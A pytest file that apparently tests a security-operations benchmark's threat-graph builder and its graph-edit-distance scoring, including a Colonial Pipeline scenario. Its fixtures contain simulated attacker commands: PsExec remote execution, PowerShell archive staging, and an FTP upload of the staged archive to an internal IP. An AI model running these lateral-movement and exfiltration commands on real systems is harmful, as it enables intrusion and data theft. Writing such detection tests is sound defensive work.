"""Tests for Tiger threat-graph truth projection."""

from __future__ import annotations

from pathlib import Path

import pytest
import yaml

from evidenceforge.models.scenario import Scenario
from socbench.capture.canonical_events import build_canonical_events
from socbench.capture.models import CanonicalEvent
from socbench.truth.tiger import (
    build_tiger_ged_spec,
    build_tiger_manifest,
    score_graph_edit_distance,
)

REPO_ROOT = Path(__file__).resolve().parents[2]
COLONIAL_BUNDLE = REPO_ROOT / "scenarios" / "colonial-pipeline"
COLONIAL_SCENARIO = COLONIAL_BUNDLE / "scenario.yaml"


def _edge_rules(manifest: dict) -> set[tuple[str, str]]:
    return {
        (edge["rule"], edge["edge_class"])
        for edge in manifest["edges"]
    }


def test_psexec_remote_service_edge_is_verifiable() -> None:
    events = [
        CanonicalEvent(
            evidence_id="EVID-launch",
            ts="2024-06-03T08:46:15Z",
            host="WKS-OPS-01",
            actor="attacker",
            kind="process",
            fields={
                "command_line": r"PsExec.exe \\FS-01 -accepteula -s cmd.exe /c whoami",
                "pid": 5508,
            },
            observed_by=["windows_event_sysmon"],
            record_id="evt-004#0",
        ),
        CanonicalEvent(
            evidence_id="EVID-svc",
            ts="2024-06-03T08:47:19Z",
            host="FS-01",
            actor="attacker",
            kind="service_installed",
            fields={
                "service_name": "PSEXESVC",
                "service_file_name": r"C:\Windows\PSEXESVC.exe",
            },
            observed_by=["windows_event_security", "ecar"],
            record_id="evt-004b#0",
        ),
    ]
    manifest = build_tiger_manifest(events)
    assert ("psexec_remote_service", "verifiable") in _edge_rules(manifest)


def test_file_artifact_chain_is_verifiable() -> None:
    events = [
        CanonicalEvent(
            evidence_id="EVID-archive",
            ts="2024-06-03T09:09:55Z",
            host="FS-01",
            actor="attacker",
            kind="process",
            fields={
                "command_line": (
                    'powershell.exe -Command "Compress-Archive -DestinationPath '
                    'C:\\Windows\\Temp\\stage-fs01.zip"'
                ),
                "staged_archive": r"C:\Windows\Temp\stage-fs01.zip",
                "pid": 5200,
            },
            record_id="evt-006a#0",
        ),
        CanonicalEvent(
            evidence_id="EVID-upload",
            ts="2024-06-03T09:18:23Z",
            host="FS-01",
            actor="attacker",
            kind="process",
            fields={
                "command_line": (
                    "powershell.exe UploadFile('ftp://10.60.30.40/incoming/stage-fs01.zip', "
                    "'C:\\\\Windows\\\\Temp\\\\stage-fs01.zip')"
                ),
                "pid": 5296,
            },
            record_id="evt-006b#1",
        ),
    ]
    manifest = build_tiger_manifest(events)
    assert ("file_artifact_continuity", "verifiable") in _edge_rules(manifest)


def test_lateral_logons_are_contextual_not_verifiable() -> None:
    events = [
        CanonicalEvent(
            evidence_id="EVID-l1",
            ts="2024-06-03T08:52:28Z",
            host="FS-01",
            actor="attacker",
            kind="logon",
            fields={"source_ip": "10.60.20.21", "logon_id": "0xd19c221", "logon_type": 3},
            record_id="evt-005#1",
        ),
        CanonicalEvent(
            evidence_id="EVID-l2",
            ts="2024-06-03T08:54:20Z",
            host="FS-02",
            actor="attacker",
            kind="logon",
            fields={"source_ip": "10.60.20.21", "logon_id": "0x957a88f", "logon_type": 3},
            record_id="evt-005b#0",
        ),
    ]
    manifest = build_tiger_manifest(events)
    assert ("lateral_shared_source_ip", "contextual") in _edge_rules(manifest)
    assert ("auth_session_action", "verifiable") not in _edge_rules(manifest)


@pytest.mark.skipif(not COLONIAL_SCENARIO.is_file(), reason="colonial scenario missing")
def test_colonial_tiger_has_non_empty_verifiable_core() -> None:
    scenario = Scenario.model_validate(
        yaml.safe_load(COLONIAL_SCENARIO.read_text(encoding="utf-8"))
    )
    events = build_canonical_events(COLONIAL_BUNDLE, scenario, seed=42)
    manifest = build_tiger_manifest(events)

    rules = _edge_rules(manifest)
    assert ("psexec_remote_service", "verifiable") in rules
    assert ("file_artifact_continuity", "verifiable") in rules
    assert manifest["summary"]["verifiable_edge_count"] >= 3
    assert manifest["summary"]["contextual_edge_count"] >= 1
    assert manifest["o3_initial_entrypoint"] is not None
    assert manifest["o3_initial_entrypoint"]["host"] == "VPN-GW-01"


@pytest.mark.skipif(not COLONIAL_SCENARIO.is_file(), reason="colonial scenario missing")
def test_colonial_process_parent_child_rule_has_no_instances() -> None:
    """process_parent_child is valid but unused on Colonial — sibling tools, not tree edges."""
    scenario = Scenario.model_validate(
        yaml.safe_load(COLONIAL_SCENARIO.read_text(encoding="utf-8"))
    )
    events = build_canonical_events(COLONIAL_BUNDLE, scenario, seed=42)
    manifest = build_tiger_manifest(events)
    parent_child = [
        edge for edge in manifest["edges"] if edge["rule"] == "process_parent_child"
    ]
    assert parent_child == []
    assert any(event.fields.get("ppid") is not None for event in events if event.kind == "process")


def test_tiger_ged_weights_favor_verifiable_over_contextual() -> None:
    spec = build_tiger_ged_spec()
    ratios = spec["weight_ratios"]
    assert ratios["verifiable_missing_vs_contextual_missing"] >= 5.0
    assert ratios["verifiable_missing_vs_contextual_extra"] >= 5.0
    assert ratios["verifiable_extra_vs_contextual_extra"] >= 5.0


def test_tiger_verifiable_core_survives_high_contextual_noise() -> None:
    reference = {
        "nodes": [{"id": f"N-{index}"} for index in range(6)],
        "edges": [
            *[
                {
                    "parent": "N-0",
                    "child": f"N-{index}",
                    "rule": "psexec_remote_service",
                    "edge_class": "verifiable",
                }
                for index in range(1, 6)
            ],
            *[
                {
                    "parent": "N-0",
                    "child": f"N-{index}",
                    "rule": "sequential_tools_same_host",
                    "edge_class": "contextual",
                }
                for index in range(1, 9)
            ],
        ],
    }
    noise_edges = [
        {
            "parent": f"N-{(index % 5) + 1}",
            "child": f"N-{((index + 2) % 5) + 1}",
            "rule": "shared_source_ip",
            "edge_class": "contextual",
        }
        for index in range(20)
    ]
    with_core_noisy = {
        "nodes": reference["nodes"],
        "edges": [*reference["edges"], *noise_edges],
    }
    without_core_contextual_only = {
        "nodes": reference["nodes"],
        "edges": [
            *reference["edges"][5:],
            *noise_edges,
            *[
                {
                    "parent": "N-0",
                    "child": f"N-{index}",
                    "rule": "shared_actor",
                    "edge_class": "contextual",
                }
                for index in range(1, 9)
            ],
        ],
    }
    spec = build_tiger_ged_spec()
    score_with_core = score_graph_edit_distance(with_core_noisy, reference, spec=spec)
    score_without_core = score_graph_edit_distance(
        without_core_contextual_only,
        reference,
        spec=spec,
    )
    assert score_without_core > score_with_core * 2


@pytest.mark.skipif(not COLONIAL_SCENARIO.is_file(), reason="colonial scenario missing")
def test_tiger_ignores_ground_truth_labels() -> None:
    scenario = Scenario.model_validate(
        yaml.safe_load(COLONIAL_SCENARIO.read_text(encoding="utf-8"))
    )
    events = build_canonical_events(COLONIAL_BUNDLE, scenario, seed=42)
    baseline = build_tiger_manifest(events)
    stripped = [
        event.model_copy(update={"phase": None, "attack": [], "actor": ""}) for event in events
    ]
    redacted = build_tiger_manifest(stripped)
    assert redacted["edges"] == baseline["edges"]
    assert redacted["summary"] == baseline["summary"]
